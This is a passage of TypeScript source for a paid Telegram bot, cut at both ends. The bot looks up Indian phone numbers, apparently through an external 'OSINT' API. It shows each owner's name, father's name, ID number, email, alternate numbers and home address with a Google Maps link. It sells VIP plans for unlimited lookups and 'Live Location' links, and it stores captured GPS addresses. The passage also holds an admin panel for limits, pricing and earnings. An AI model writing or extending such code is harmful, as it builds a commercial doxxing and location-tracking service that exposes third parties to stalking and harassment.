  if (circle && circle !== 'Not found' && !cleaned.some((c) => c.toLowerCase().includes(circle.toLowerCase()))) {
    cleaned.push(circle);
  }
  const displayAddress = cleaned.join(', ') || areaLabel || 'India';
  const query = cleaned.slice(-4).join(', ') || displayAddress;
  const mapUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(query + ', India')}`;
  return { displayAddress, mapUrl };
}

function cleanMapQueryFromRecord(rec: any, areaLabel: string): { displayAddress: string; mapUrl: string } {
  const rawAddr = String(rec?.address || areaLabel || '').replace(/!/g, ', ');
  const circle = String(rec?.circle || '').trim();
  const pName = String(rec?.name || '').trim();
  const fName = String(rec?.fatherName || '').trim();
  const parts = rawAddr.split(/[,;|\n]+/).map((p) => p.trim()).filter(Boolean);
  const cleaned: string[] = [];
  for (let p of parts) {
    p = p.replace(/\b(S\/O|W\/O|D\/O|C\/O|H\/O|F\/O|M\/O)\b[^,]*/gi, '').trim();
    if (pName && pName !== 'Not found' && p.toLowerCase() === pName.toLowerCase()) continue;
    if (fName && fName !== 'Not found' && p.toLowerCase() === fName.toLowerCase()) continue;
    p = p.replace(/^(H\.?\s*NO\.?|HOUSE\s*NO\.?|FLAT\s*NO\.?|PLOT\s*NO\.?|WARD\s*NO\.?)\s*[-:#.]?\s*[A-Z0-9/-]+\s*/i, '').trim();
    if (p.length >= 2 && !cleaned.some((c) => c.toLowerCase() === p.toLowerCase())) cleaned.push(p);
  }
  if (circle && circle !== 'Not found' && !cleaned.some((c) => c.toLowerCase().includes(circle.toLowerCase()))) {
    cleaned.push(circle);
  }
  const displayAddress = cleaned.join(', ') || areaLabel || 'India';
  const query = cleaned.slice(-4).join(', ') || displayAddress;
  const mapUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(query + ', India')}`;
  return { displayAddress, mapUrl };
}

function renderBotNumberResultView(_user: UserProfile, info: NumberIntelligence, viewMode: 'info' | 'location' = 'info') {
  if (viewMode === 'location') {
    const primaryRec = info.records[0];
    const resolvedName = primaryRec?.name && primaryRec.name !== 'Not found' ? primaryRec.name : (info.truecallerName || 'Not found');
    const loc = cleanMapQueryFromRecord(primaryRec, info.areaLabel || 'India');
    const lines: string[] = [
      `<b>📍 ${toThinSans('Number Location')}</b>`,
      ``,
      `<b>• ${toThinSans('Name')}:</b> ${escapeHtml(toThinSans(resolvedName))}`,
      `<b>• ${toThinSans('Address')}:</b> ${escapeHtml(toThinSans(loc.displayAddress))}`,
      `<b>• ${toThinSans('Map')}:</b> <a href="${escapeHtml(loc.mapUrl)}">${toThinSans('Open Google Maps')}</a>`,
    ];
    const keyboard: any[][] = [
      [buildInlineButton(`🗺️ ${toThinSans('Open Google Maps')}`, { url: loc.mapUrl, style: 'success' })],
      [buildInlineButton(`🔍 ${toThinSans('Number to Info')}`, { callback_data: `info_${info.rawDigits}`, style: 'primary' })],
      [
        buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
        buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
      ],
    ];
    return { text: lines.join('\n'), reply_markup: { inline_keyboard: keyboard }, withMedia: false };
  }

  const waUrl = `https://wa.me/91${info.rawDigits}`;
  const tgUrl = `https://t.me/+91${info.rawDigits}`;
  const lines: string[] = [
    `<b>🔍 ${toThinSans('Number Details')} — ${escapeHtml(toThinSans(info.rawDigits))}</b>`,
  ];
  const maxRecs = Math.min(info.records.length, 5);
  for (let i = 0; i < maxRecs; i++) {
    const rec = info.records[i];
    lines.push(``);
    if (maxRecs > 1) lines.push(`<b>◈ ${toThinSans(`Record #${i + 1}`)}</b>`);
    lines.push(`<b>• ${toThinSans('Name')}:</b> ${escapeHtml(toThinSans(rec.name))}`);
    if (rec.fatherName && rec.fatherName !== 'Not found') lines.push(`<b>• ${toThinSans('Father')}:</b> ${escapeHtml(toThinSans(rec.fatherName))}`);
    lines.push(`<b>• ${toThinSans('Mobile')}:</b> ${escapeHtml(toThinSans(rec.mobile))}`);
    if (rec.altMobile && rec.altMobile !== 'Not found') lines.push(`<b>• ${toThinSans('Alt No')}:</b> ${escapeHtml(toThinSans(rec.altMobile))}`);
    if (rec.circle && rec.circle !== 'Not found') lines.push(`<b>• ${toThinSans('Circle')}:</b> ${escapeHtml(toThinSans(rec.circle))}`);
    if (rec.idNumber && rec.idNumber !== 'Not found') lines.push(`<b>• ${toThinSans('ID No')}:</b> ${escapeHtml(toThinSans(rec.idNumber))}`);
    if (rec.email && rec.email !== 'Not found') lines.push(`<b>• ${toThinSans('Email')}:</b> ${escapeHtml(toThinSans(rec.email))}`);
    lines.push(`<b>• ${toThinSans('Address')}:</b> ${escapeHtml(toThinSans(rec.address))}`);
  }
  const keyboard: any[][] = [
    [
      buildInlineButton(`💬 ${toThinSans('Open WhatsApp')}`, { url: waUrl, style: 'success' }),
      buildInlineButton(`✈️ ${toThinSans('Open Telegram')}`, { url: tgUrl, style: 'primary' }),
    ],
    [
      buildInlineButton(`📍 ${toThinSans('Number to Location')}`, { callback_data: `loc_${info.rawDigits}`, style: 'success' }),
    ],
    [
      buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
    ],
  ];
  return { text: lines.join('\n'), reply_markup: { inline_keyboard: keyboard }, withMedia: false };
}
function renderBotHistoryView(user: UserProfile) {
  const history = Array.isArray(user.history) ? user.history.slice(0, 10) : [];
  const captures = Array.isArray(user.liveCaptures) ? user.liveCaptures.slice(0, 3) : [];
  const lastOrder = Object.values(state.orders)
    .filter((o) => o.userId === user.id)
    .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0];

  const lines: string[] = [`<b>📜 ${toThinSans('My History')}</b>`, ``];
  const keyboard: any[][] = [];

  if (lastOrder) {
    const amt = lastOrder.payableAmount || String(lastOrder.amount);
    const statusLabel = lastOrder.status === 'PAID' ? 'Paid' : 'Pending';
    lines.push(
      `<b>• ${toThinSans('Last Plan')}:</b> ₹${toThinSans(amt)} — ${escapeHtml(toThinSans(lastOrder.planName))} (${toThinSans(statusLabel)})`,
      ``
    );

    const payBtnText =
      lastOrder.status === 'PAID'
        ? `✅ ${toThinSans(`Paid • ₹${amt}`)}`
        : `🔄 ${toThinSans(`Check Payment • ₹${amt}`)}`;
    keyboard.push([
      buildInlineButton(payBtnText, {
        callback_data: `chk_${lastOrder.orderId}`,
        style: lastOrder.status === 'PAID' ? 'primary' : 'success',
      }),
    ]);
  }

  if (captures.length > 0) {
    lines.push(`<b>🛰️ ${toThinSans('Live Location History')}:</b>`);
    for (const c of captures) {
      lines.push(`• ${escapeHtml(toThinSans(c.address.slice(0, 45)))}`);
    }
    lines.push(``);
    keyboard.push([
      buildInlineButton(`🗺️ ${toThinSans('Open Last Live Map')}`, {
        url: captures[0].mapsUrl,
        style: 'success',
      }),
    ]);
  }

  if (history.length === 0) {
    lines.push(`${toThinSans('Abhi tak koi number search nahi kiya hai.')}`);
  } else {
    lines.push(`<b>📍 ${toThinSans('Searched Numbers')}:</b>`);
    for (const h of history) {
      const recName =
        h.resultSummary?.name && h.resultSummary.name !== 'Not found'
          ? h.resultSummary.name
          : 'Unknown';
      lines.push(`• ${escapeHtml(toThinSans(h.queryNumber))} — ${escapeHtml(toThinSans(recName))}`);
    }

    const lastNum = history[0];
    const lastRecName =
      lastNum.resultSummary?.name && lastNum.resultSummary.name !== 'Not found'
        ? lastNum.resultSummary.name.slice(0, 14)
        : 'Location';
    keyboard.push([
      buildInlineButton(`📍 ${toThinSans(lastNum.queryNumber)} • ${toThinSans(lastRecName)}`, {
        callback_data: `hist_${lastNum.queryNumber}`,
        style: 'primary',
      }),
    ]);
  }

  if (history.length > 0 || captures.length > 0) {
    keyboard.push([
      buildInlineButton(`✕ ${toThinSans('Clear')}`, { callback_data: 'clear_history', style: 'danger' }),
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
    ]);
  } else {
    keyboard.push([buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })]);
  }

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function renderBotProfileView(user: UserProfile) {
  const refLink = getUserReferralLink(user);
  const { isVip, dailyLimit, remainingToday } = syncUserDailyUsage(user);
  const { liveLimit, remainingLifetime } = syncUserLiveUsage(user);
  const bonus = state.config.referralBonusCredits || 2;

  const text =
    `<b>👤 ${toThinSans('My Profile')}</b>\n\n` +
    `<b>• ${toThinSans('Name')}:</b> ${escapeHtml(toThinSans(user.firstName))}\n` +
    `<b>• ${toThinSans('User ID')}:</b> ${toThinSans(String(user.id))}\n` +
    `<b>• ${toThinSans('Account')}:</b> ${getUserStatusBadge(user)}\n` +
    `<b>• ${toThinSans('Number Location')}:</b> ${
      isVip
        ? `<b>${toThinSans('Unlimited')}</b>`
        : `${toThinSans(`${remainingToday} / ${dailyLimit} Free Today`)}`
    }\n` +
    `<b>• ${toThinSans('Live Location')}:</b> ${
      isVip
        ? `<b>${toThinSans('Unlimited')}</b>`
        : `${toThinSans(`${remainingLifetime} / ${liveLimit} Free Left`)}`
    }\n` +
    `<b>• ${toThinSans('Total Checked')}:</b> ${toThinSans(String(user.totalLookups))}\n` +
    `<b>• ${toThinSans('Refer Bonus')}:</b> +${toThinSans(String(bonus))} ${toThinSans('Free Search / Friend')}`;

  const keyboard: any[][] = [
    [
      buildInlineButton(`🎁 ${toThinSans('Copy Refer Link')}`, {
        copy_text: refLink,
        style: 'primary',
      }),
    ],
    [
      buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
      buildInlineButton(`📜 ${toThinSans('History')}`, { callback_data: 'nav_history', style: 'primary' }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function renderBotPricingView(user: UserProfile) {
  const lines = [
    `<b>👑 ${toThinSans('VIP Plans')}</b>`,
    ``,
    `<b>• ${toThinSans('Account')}:</b> ${getUserStatusBadge(user)}`,
    `<b>✓</b> ${toThinSans('Unlimited Number to Location (Google Maps)')}`,
    `<b>✓</b> ${toThinSans('Unlimited Live Location Links')}`,
    ``,
    `${toThinSans('Niche apna VIP Plan chunein:')}`,
  ];

  const planRows: any[][] = [];
  for (const p of state.config.plans) {
    planRows.push([
      buildInlineButton(`✦ ${toThinSans(p.name)} (${toThinSans(`${p.days} Days`)}) — ₹${toThinSans(String(p.price))}`, {
        callback_data: `buy_plan_${p.id}`,
        style: p.buttonStyle || 'success',
      }),
    ]);
  }
  planRows.push([
    buildInlineButton(`📜 ${toThinSans('History')}`, { callback_data: 'nav_history', style: 'primary' }),
    buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
  ]);

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: planRows },
    withMedia: false,
  };
}

function renderBotOrderCheckoutView(order: PaymentOrder) {
  const displayAmount = order.payableAmount || String(order.amount);
  const text =
    `<b>💳 ${toThinSans('Pay with UPI')}</b>\n\n` +
    `<b>• ${toThinSans('Plan')}:</b> ${escapeHtml(toThinSans(`${order.planName} (${order.days} Days)`))}\n` +
    `<b>• ${toThinSans('Pay Amount')}:</b> <b>₹${toThinSans(displayAmount)}</b>\n` +
    `<b>• ${toThinSans('UPI App')}:</b> ${toThinSans('PhonePe, GPay, Paytm, FamApp')}\n\n` +
    `${toThinSans(`QR Code scan karke ₹${displayAmount} pay karein. Payment hote hi VIP apne aap chalu ho jayega.`)}`;

  const rows: any[][] = [
    [
      buildInlineButton(`✅ ${toThinSans('Check Payment')}`, {
        callback_data: `chk_${order.orderId}`,
        style: 'success',
      }),
    ],
    [
      buildInlineButton(`« ${toThinSans('Back')}`, {
        callback_data: 'nav_pricing',
        style: 'danger',
      }),
    ],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: rows },
    withMedia: false,
  };
}

async function sendBotOrderQrPhoto(
  chatId: number,
  user: UserProfile,
  order: PaymentOrder,
  replaceMessageId?: number
) {
  const token = state.config.botToken.trim();
  const view = renderBotOrderCheckoutView(order);
  try {
    const pngBuffer = await QRCode.toBuffer(order.upiIntentUrl, {
      width: 600,
      margin: 2,
      color: {
        dark: '#090D16',
        light: '#FFFFFF',
      },
    });

    const form = new FormData();
    form.append('chat_id', String(chatId));
    form.append('photo', new Blob([new Uint8Array(pngBuffer)], { type: 'image/png' }), `${order.orderId}.png`);
    form.append('caption', view.text);
    form.append('parse_mode', 'HTML');
    form.append('reply_markup', JSON.stringify(view.reply_markup));

    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
    let resp = await fetchWithTimeout(url, { method: 'POST', body: form }, 8000);
    let data: any = await resp.json();

    if (!data?.ok && String(data?.description || '').toLowerCase().includes('style')) {
      const cleanedMarkup = JSON.parse(JSON.stringify(view.reply_markup));
      if (cleanedMarkup.inline_keyboard) {
        for (const row of cleanedMarkup.inline_keyboard) {
          for (const btn of row) delete btn.style;
        }
      }
      const retryForm = new FormData();
      retryForm.append('chat_id', String(chatId));
      retryForm.append('photo', new Blob([new Uint8Array(pngBuffer)], { type: 'image/png' }), `${order.orderId}.png`);
      retryForm.append('caption', view.text);
      retryForm.append('parse_mode', 'HTML');
      retryForm.append('reply_markup', JSON.stringify(cleanedMarkup));
      resp = await fetchWithTimeout(url, { method: 'POST', body: retryForm }, 8000);
      data = await resp.json();
    }

    if (data?.ok && data.result?.message_id) {
      if (replaceMessageId && replaceMessageId !== data.result.message_id) {
        callTelegram('deleteMessage', { chat_id: chatId, message_id: replaceMessageId }, 4000).catch(() => {});
      }
      order.botQrMessageId = data.result.message_id;
      user.lastBotMessageId = data.result.message_id;
      user.lastBotMessageHasPhoto = true;
      saveState();
      return;
    }
  } catch (err: any) {
    console.error('Failed to send QR photo in bot:', err.message);
  }

  // Fallback to in-place edit if photo upload fails
  if (replaceMessageId) {
    await editSectionInPlace(chatId, replaceMessageId, user, view);
  } else {
    await sendReplyMessage(chatId, user, view);
  }
}

// ============================================================================
// IN-BOT ADMIN PANEL — WITH DAILY LIMIT (2/D), LIVE LIMIT (1), PLANS & API
// ============================================================================
function getAdminStats() {
  const allUsers = Object.values(state.users);
  const now = new Date();
  const premiumUsers = allUsers.filter(
    (u) => u.isPremium && (!u.premiumUntil || new Date(u.premiumUntil) > now)
  );
  const allOrders = Object.values(state.orders);
  const paidOrders = allOrders.filter((o) => o.status === 'PAID');
  const pendingOrders = allOrders.filter((o) => o.status === 'PENDING');
  const totalEarnings = paidOrders.reduce((acc, o) => acc + o.amount, 0);

  const todayStr = now.toISOString().slice(0, 10);
  const todayEarnings = paidOrders
    .filter((o) => (o.paidAt || o.createdAt).startsWith(todayStr))
    .reduce((acc, o) => acc + o.amount, 0);

  return {
    allUsers,
    premiumUsers,
    paidOrders,
    pendingOrders,
    totalEarnings,
    todayEarnings,
  };
}

function renderInBotAdminHomeView(notice?: string) {
  const { allUsers, premiumUsers, paidOrders, totalEarnings } = getAdminStats();
  const cfg = state.config;
  const dailyLim = cfg.dailyLookupLimit ?? cfg.defaultTrialCredits ?? 2;
  const liveLim = cfg.liveLocationLifetimeLimit ?? 1;

  const text =
    `<b>❖ ${toThinSans('Admin Panel')}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('Users')}:</b> ${toThinSans(String(allUsers.length))}  |  <b>${toThinSans('VIP')}:</b> ${toThinSans(String(premiumUsers.length))}\n` +
    `<b>• ${toThinSans('Daily Location Limit')}:</b> ${toThinSans(`${dailyLim} / Day`)}\n` +
    `<b>• ${toThinSans('Live Location Limit')}:</b> ${toThinSans(`${liveLim} / Lifetime`)}\n` +
    `<b>• ${toThinSans('Earnings')}:</b> ₹${toThinSans(String(totalEarnings))} (${toThinSans(`${paidOrders.length} Orders`)})\n` +
    `<b>• ${toThinSans('Start Image')}:</b> ${toThinSans(cfg.bannerEnabled ? 'ON' : 'OFF')}`;

  const keyboard = [
    [
      buildInlineButton(`✦ ${toThinSans('Give VIP')}`, { callback_data: 'adm_sec_grant', style: 'success' }),
      buildInlineButton(`◈ ${toThinSans(`Daily Limit: ${dailyLim}`)}`, { callback_data: 'adm_prompt_daily_limit', style: 'primary' }),
    ],
    [
      buildInlineButton(`🛰️ ${toThinSans(`Live Limit: ${liveLim}`)}`, { callback_data: 'adm_prompt_live_limit', style: 'success' }),
      buildInlineButton(`✦ ${toThinSans('Plans')}`, { callback_data: 'adm_sec_plans', style: 'primary' }),
    ],
    [
      buildInlineButton(`❖ ${toThinSans('Users')}`, { callback_data: 'adm_sec_users', style: 'primary' }),
      buildInlineButton(`◈ ${toThinSans('Earnings')}`, { callback_data: 'adm_sec_earnings', style: 'success' }),
    ],
    [
      buildInlineButton(`⟐ ${toThinSans('Settings')}`, { callback_data: 'adm_sec_config', style: 'success' }),
      buildInlineButton(`⟡ ${toThinSans('Broadcast')}`, { callback_data: 'adm_sec_tools', style: 'primary' }),
    ],
    [
      buildInlineButton(`« ${toThinSans('Exit')}`, { callback_data: 'nav_home', style: 'danger' }),
    ],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminGrantSection(notice?: string) {
  const dailyLim = state.config.dailyLookupLimit ?? state.config.defaultTrialCredits ?? 2;
  const liveLim = state.config.liveLocationLifetimeLimit ?? 1;
  const text =
    `<b>❖ ${toThinSans('VIP & Limits Control')}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('VIP Benefit')}:</b> ${toThinSans('Unlimited Location & Live GPS')}\n` +
    `<b>• ${toThinSans('Free Daily Limit')}:</b> ${toThinSans(`${dailyLim} / Day`)}\n` +
    `<b>• ${toThinSans('Free Live Location')}:</b> ${toThinSans(`${liveLim} / Lifetime`)}\n\n` +
    `${toThinSans('Select an option below:')}`;

  const keyboard = [
    [
      buildInlineButton(`✦ ${toThinSans('Give VIP')}`, {
        callback_data: 'adm_prompt_give_vip',
        style: 'success',
      }),
      buildInlineButton(`◈ ${toThinSans('User Limit')}`, {
        callback_data: 'adm_prompt_user_limit',
        style: 'primary',
      }),
    ],
    [
      buildInlineButton(`⊕ ${toThinSans('Add Credits')}`, {
        callback_data: 'adm_prompt_add_credits',
        style: 'primary',
      }),
      buildInlineButton(`✕ ${toThinSans('Remove VIP')}`, {
        callback_data: 'adm_prompt_revoke_vip',
        style: 'danger',
      }),
    ],
    [
      buildInlineButton(`◈ ${toThinSans(`Daily Limit (${dailyLim}/D)`)}`, {
        callback_data: 'adm_prompt_daily_limit',
        style: 'primary',
      }),
      buildInlineButton(`🛰️ ${toThinSans(`Live Limit (${liveLim})`)}`, {
        callback_data: 'adm_prompt_live_limit',
        style: 'success',
      }),
    ],
    [
      buildInlineButton(`⊕ ${toThinSans('+2 Cr All')}`, {
        callback_data: 'adm_bulk_credits_5',
        style: 'primary',
      }),
      buildInlineButton(`✦ ${toThinSans('+7D VIP All')}`, {
        callback_data: 'adm_bulk_vip_7d',
        style: 'success',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' })],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminUsersSection(mode: 'vip' | 'all' = 'vip', notice?: string) {
  const { allUsers, premiumUsers } = getAdminStats();

  const lines: string[] = [
    `<b>❖ ${mode === 'vip' ? toThinSans('VIP Users') : toThinSans('All Users')}</b>`,
  ];
  if (notice) lines.push(`<b>✓ ${escapeHtml(toThinSans(notice))}</b>`);
  lines.push(`<b>• ${toThinSans('Total')}:</b> ${toThinSans(String(allUsers.length))}  |  <b>${toThinSans('VIP')}:</b> ${toThinSans(String(premiumUsers.length))}`, ``);

  const targetList =
    mode === 'vip'
      ? allUsers.filter(
          (u) => (u.isPremium && (!u.premiumUntil || new Date(u.premiumUntil) > new Date())) || u.lastPlanName
        )
      : allUsers.slice(0, 10);

  const userRows: any[][] = [];

  if (targetList.length === 0) {
    lines.push(
      mode === 'vip'
        ? `${toThinSans('No active VIP users yet.')}`
        : `${toThinSans('No users found.')}`
    );
  } else {
    targetList.slice(0, 6).forEach((u) => {
      const isVip = u.isPremium && (!u.premiumUntil || new Date(u.premiumUntil) > new Date());
      userRows.push([
        buildInlineButton(
          `${isVip ? '✦' : '•'} ${toThinSans(u.firstName.slice(0, 10))} (${u.username ? '@' + u.username.slice(0, 8) : u.id})`,
          {
            callback_data: `adm_u_${u.id}`,
            style: isVip ? 'success' : 'primary',
          }
        ),
      ]);
    });
  }

  const keyboard = [
    [
      buildInlineButton(`✦ ${toThinSans('VIP Users')}`, {
        callback_data: 'adm_list_vip',
        style: mode === 'vip' ? 'success' : 'primary',
      }),
      buildInlineButton(`❖ ${toThinSans('All Users')}`, {
        callback_data: 'adm_list_users',
        style: mode === 'all' ? 'success' : 'primary',
      }),
    ],
    ...userRows.slice(0, 5),
    [
      buildInlineButton(`◈ ${toThinSans('Find User')}`, {
        callback_data: 'adm_prompt_find_user',
        style: 'primary',
      }),
      buildInlineButton(`✕ ${toThinSans('Ban User')}`, {
        callback_data: 'adm_prompt_ban_user',
        style: 'danger',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' })],
  ];

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminUserDetail(targetUser: UserProfile, notice?: string) {
  const { isVip, dailyLimit, usedToday } = syncUserDailyUsage(targetUser);
  const { liveLimit, usedLifetime } = syncUserLiveUsage(targetUser);
  const daysLeft = getRemainingDays(targetUser.premiumUntil);

  const text =
    `<b>❖ ${toThinSans('Manage User')}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('Name')}:</b> ${escapeHtml(toThinSans(targetUser.firstName))}\n` +
    `<b>• ${toThinSans('Username')}:</b> ${targetUser.username ? `@${escapeHtml(targetUser.username)}` : toThinSans('None')}\n` +
    `<b>• ${toThinSans('User ID')}:</b> ${toThinSans(String(targetUser.id))}\n` +
    `<b>• ${toThinSans('Status')}:</b> ${isVip ? `<b>✦ ${toThinSans(`VIP (${daysLeft}D)`)}</b>` : `<b>${toThinSans('Free User')}</b>`}\n` +
    `<b>• ${toThinSans('Daily Limit')}:</b> ${isVip ? `<b>${toThinSans('Unlimited')}</b>` : `${toThinSans(`${usedToday}/${dailyLimit} Used`)}`}\n` +
    `<b>• ${toThinSans('Live Location')}:</b> ${isVip ? `<b>${toThinSans('Unlimited')}</b>` : `${toThinSans(`${usedLifetime}/${liveLimit} Used`)}`}\n` +
    `<b>• ${toThinSans('Lookups')}:</b> ${toThinSans(String(targetUser.totalLookups))}\n` +
    `<b>• ${toThinSans('Banned')}:</b> ${toThinSans(targetUser.isBanned ? 'Yes' : 'No')}`;

  const uid = targetUser.id;
  const keyboard = [
    [
      buildInlineButton(`+7D VIP`, { callback_data: `adm_uvip_${uid}_7`, style: 'success' }),
      buildInlineButton(`+30D VIP`, { callback_data: `adm_uvip_${uid}_30`, style: 'success' }),
      buildInlineButton(`+365D VIP`, { callback_data: `adm_uvip_${uid}_365`, style: 'success' }),
    ],
    [
      buildInlineButton(`+2 Daily`, { callback_data: `adm_ulim_${uid}_2`, style: 'primary' }),
      buildInlineButton(`Reset Limits`, { callback_data: `adm_urst_${uid}`, style: 'primary' }),
      buildInlineButton(`Un-VIP`, { callback_data: `adm_urevoke_${uid}`, style: 'danger' }),
    ],
    [
      buildInlineButton(targetUser.isBanned ? `✓ ${toThinSans('Unban')}` : `✕ ${toThinSans('Ban')}`, {
        callback_data: `adm_uban_${uid}`,
        style: targetUser.isBanned ? 'success' : 'danger',
      }),
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_sec_users', style: 'primary' }),
    ],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminPlansSection(notice?: string) {
  const dailyLim = state.config.dailyLookupLimit ?? state.config.defaultTrialCredits ?? 2;
  const liveLim = state.config.liveLocationLifetimeLimit ?? 1;
  const lines = [
    `<b>❖ ${toThinSans('Plans & Pricing')}</b>`,
    ...(notice ? [`<b>✓ ${escapeHtml(toThinSans(notice))}</b>`] : []),
    `<b>• ${toThinSans('Free Daily Limit')}:</b> ${toThinSans(`${dailyLim} / Day`)}`,
    `<b>• ${toThinSans('Free Live Location')}:</b> ${toThinSans(`${liveLim} / Lifetime`)}`,
    ``,
    `${toThinSans('Select any plan below to edit its price or days:')}`,
  ];

  const planButtons = state.config.plans.map((p) => [
    buildInlineButton(`✦ ${toThinSans(p.name)} (${toThinSans(`${p.days}D`)}) — ₹${toThinSans(String(p.price))}`, {
      callback_data: `adm_plan_${p.id}`,
      style: p.buttonStyle || 'success',
    }),
  ]);

  const keyboard = [
    ...planButtons,
    [
      buildInlineButton(`⊕ ${toThinSans('Add Plan')}`, { callback_data: 'adm_prompt_add_plan', style: 'success' }),
      buildInlineButton(`◈ ${toThinSans(`Limit: ${dailyLim}/D`)}`, {
        callback_data: 'adm_prompt_trial_credits',
        style: 'primary',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' })],
  ];

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminSinglePlanEditor(plan: PricingPlan, notice?: string) {
  const text =
    `<b>❖ ${toThinSans(`Edit Plan: ${plan.name}`)}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('Name')}:</b> ${escapeHtml(toThinSans(plan.name))}\n` +
    `<b>• ${toThinSans('Days')}:</b> ${toThinSans(`${plan.days} Days`)}\n` +
    `<b>• ${toThinSans('Price')}:</b> ₹${toThinSans(String(plan.price))}`;

  const keyboard = [
    [
      buildInlineButton(`✦ ${toThinSans(`Price (₹${plan.price})`)}`, {
        callback_data: `adm_plan_price_${plan.id}`,
        style: 'success',
      }),
      buildInlineButton(`◈ ${toThinSans(`Days (${plan.days}D)`)}`, {
        callback_data: `adm_plan_days_${plan.id}`,
        style: 'primary',
      }),
    ],
    [
      buildInlineButton(`⟡ ${toThinSans('Rename')}`, {
        callback_data: `adm_plan_name_${plan.id}`,
        style: 'primary',
      }),
      buildInlineButton(`✕ ${toThinSans('Delete')}`, {
        callback_data: `adm_plan_del_${plan.id}`,
        style: 'danger',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_sec_plans', style: 'danger' })],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminEarningsSection(notice?: string) {
  const { paidOrders, pendingOrders, totalEarnings, todayEarnings, premiumUsers } = getAdminStats();

  const lines = [
    `<b>❖ ${toThinSans('Earnings & Orders')}</b>`,
    ...(notice ? [`<b>✓ ${escapeHtml(toThinSans(notice))}</b>`] : []),
    ``,
    `<b>• ${toThinSans('Total Earnings')}:</b> ₹${toThinSans(String(totalEarnings))}`,
    `<b>• ${toThinSans("Today's Earnings")}:</b> ₹${toThinSans(String(todayEarnings))}`,
    `<b>• ${toThinSans('Paid Orders')}:</b> ${toThinSans(String(paidOrders.length))}  |  <b>${toThinSans('Pending')}:</b> ${toThinSans(String(pendingOrders.length))}`,
    `<b>• ${toThinSans('VIP Users')}:</b> ${toThinSans(String(premiumUsers.length))}`,
  ];

  const pendingApproveRows = pendingOrders.slice(0, 3).map((po) => [
    buildInlineButton(`✓ ${toThinSans(`Approve ${po.userName.slice(0, 8)} (₹${po.amount})`)}`, {
      callback_data: `adm_approve_${po.orderId}`,
      style: 'success',
    }),
  ]);

  const keyboard = [
    ...pendingApproveRows,
    [
      buildInlineButton(`⊕ ${toThinSans('Add Earning')}`, {
        callback_data: 'adm_prompt_manual_order',
        style: 'success',
      }),
      buildInlineButton(`✦ ${toThinSans('VIP List')}`, {
        callback_data: 'adm_list_vip',
        style: 'primary',
      }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'adm_home', style: 'danger' })],
  ];

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: keyboard },
  };
}

function renderInBotAdminConfigSection(notice?: string) {
  const cfg = state.config;
  const channelUrl = (cfg.channelUrl || 'https://t.me/followxpresss').trim();
  const groupUrl = (cfg.groupUrl || cfg.channelUrl || 'https://t.me/followxpresss').trim();
  const formattedChannel = channelUrl.startsWith('http') ? channelUrl : `https://t.me/${channelUrl.replace(/^@/, '')}`;
  const formattedGroup = groupUrl.startsWith('http') ? groupUrl : `https://t.me/${groupUrl.replace(/^@/, '')}`;

  const text =
    `<b>❖ ${toThinSans('Bot Settings & API')}</b>\n` +
    (notice ? `\n<b>✓ ${escapeHtml(toThinSans(notice))}</b>\n` : '') +
    `\n<b>• ${toThinSans('Start Image')}:</b> ${toThinSans(cfg.bannerEnabled ? 'ON' : 'OFF')}\n` +
    `<b>• ${toThinSans('Number API')}:</b> ${toThinSans(cfg.osintApiUrl ? 'Connected' : 'Not Set')}\n` +
    `<b>• ${toThinSans('API Key')}:</b> ${escapeHtml(toThinSans(cfg.osintApiKey || 'Default'))}\n` +
